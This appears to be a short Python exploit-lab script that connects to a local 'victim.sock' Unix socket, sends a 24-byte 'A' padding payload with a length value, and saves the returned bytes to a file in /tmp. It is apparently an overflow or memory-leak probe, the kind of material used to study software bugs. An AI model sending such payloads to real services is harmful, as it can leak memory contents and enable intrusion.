import socket
import sys, os

sock = os.getenv("HOME") + "/victim.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock)
str = b'A' * 24 + b'\n48\n'
s.send(str)
data = s.recv(1024)
s.close()

print(data)
print(repr(data))

filename = '/tmp/someData.txt'
with open(filename, 'w') as file_object:
    file_object.write(repr(data))
    file_object.write("\n")
